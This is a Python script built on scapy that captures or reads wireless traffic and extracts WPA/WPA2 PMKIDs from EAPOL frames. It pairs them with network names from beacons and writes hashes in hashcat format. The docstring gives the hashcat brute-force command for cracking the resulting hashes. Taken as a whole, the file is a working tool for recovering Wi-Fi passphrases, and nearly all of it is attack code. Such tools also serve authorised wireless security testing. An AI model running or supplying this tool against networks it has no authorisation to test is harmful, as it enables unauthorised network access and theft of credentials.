#!/usr/bin/env python
"""
./hashcat64.bin -m 16800 hashes.file -a 3 -w 3 <psk>

Adjust under __main__ accordingly prior to launch
"""
import binascii
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import packetEssentials as PE
import os
import sys

## Dict setup
essidDict = {}
pmkDict = {}

## FS cleanup
try:
    os.remove('hashes.file')
except:
    pass

def pmkRip(packet):
    """Attempt to rip the PMKID"""
    pmkid = PE.pt.byteRip(packet[Raw].load,
                          order = 'last',
                          qty = 16,
                          compress = True)
    if pmkid[-1] != 0:
        return pmkid
    else:
        return False


def pHandler(packet):
    """Packet Handler"""
    ## BEACONS
    if packet.haslayer(Dot11Beacon):
        ## ESSID MAC: ESSID
        essidDict.update({packet[Dot11].addr2: packet[Dot11Elt].info})

    ## EAPOLs
    elif packet.haslayer(EAPOL):

        ## AES == 89, TKIP == 8a
        if PE.pt.byteRip(packet[Raw], qty = 3)[6:] == '89' or\
        PE.pt.byteRip(packet[Raw], qty = 3)[6:].lower() == '8a':

            ## Assume we've already seen the beacon, ignore chicken/egg scenario
            pmkID = pmkRip(packet)
            if pmkID is not False:

                ## ESSID MAC: packet
                pmkDict.update({packet[Dot11].addr2: packet})

                ## Set PMKID
                ourHash = pmkID + '*'

                ## BSSID
                ourHash += packet[Dot11].addr2.replace(':', '') + '*'

                ## Tgt MAC
                ourHash += packet[Dot11].addr1.replace(':', '') + '*'

                ## ESSID
                try:

                    # ourHash += essidDict.get(packet[Dot11].addr2).encode('hex')

                    ## Further 3x troubleshooting
                    # ourHash += str(binascii.hexlify(essidDict.get(packet[Dot11].addr2)))

                    ## Hack it up
                    # print(
                    # str(
                    # binascii.hexlify(
                    # essidDict.get(packet[Dot11].addr2)
                    # )
                    # ).replace("b'", '').replace("'", '')
                    # )

                    ourHash += str(binascii.hexlify(essidDict.get(packet[Dot11].addr2))).replace("b'", '').replace("'", '')  ## Dirty workaround to make this work with Python2x and 3x.
                    print (ourHash + ' -- ' + essidDict.get(packet[Dot11].addr2).decode() + ' -- ' + packet[Dot11].addr2 + '\n')
                    with open('hashes.file', 'a') as oFile:
                        oFile.write(ourHash + '\n')
                except Exception as e:
                    print('\n\n')
                    print(e)
                    print ('Error on line {}'.format(sys.exc_info()[-1].tb_lineno))


if __name__ == '__main__':
    try:
        fName = sys.argv[1]
        pkts = rdpcap(fName)
        for pkt in pkts:
            pHandler(pkt)
    except:
        p = sniff(iface = 'wlan0mon',
                  prn = pHandler,
                  lfilter = lambda x: x.haslayer(Dot11Beacon) or x.haslayer(EAPOL),  # Compare the speeds one day against pHandler
                  store = 0)
